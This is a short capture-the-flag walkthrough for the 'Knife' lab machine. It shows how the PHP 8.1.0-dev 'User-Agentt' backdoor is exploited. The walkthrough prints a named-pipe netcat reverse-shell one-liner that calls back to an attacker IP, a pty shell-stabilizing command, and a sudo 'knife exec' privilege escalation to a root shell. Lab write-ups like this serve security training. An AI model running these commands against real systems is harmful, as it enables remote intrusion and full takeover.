MACHINE NAME: Knife
MACHINE IP: 10.10.10.242

Nmap.

Open ports of interest: 22 and 80 running SSH and HTTP respectively.
From Wappalyzer, the site runs on PHP 8.1.0 as well.

PHP 8.1.0-dev - 'User-Agentt' Remote Code Execution



An early release of PHP, the PHP 8.1.0-dev version was released with a backdoor on March 28th 2021, but the backdoor was quickly discovered and removed. If this version of PHP runs on a server, an attacker can execute arbitrary code by sending the User-Agentt header.
The following exploit uses the backdoor to provide a pseudo shell ont the host.


Set up a netcat listener - Busybox version used for this case.

rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.103 4242 >/tmp/f

Stabilize the shell.

export TERM=xterm

python3 -c 'import pty; pty.spawn("/bin/sh")'

PrivEsc.

sudo knife exec --exec "exec '/bin/sh -i' "

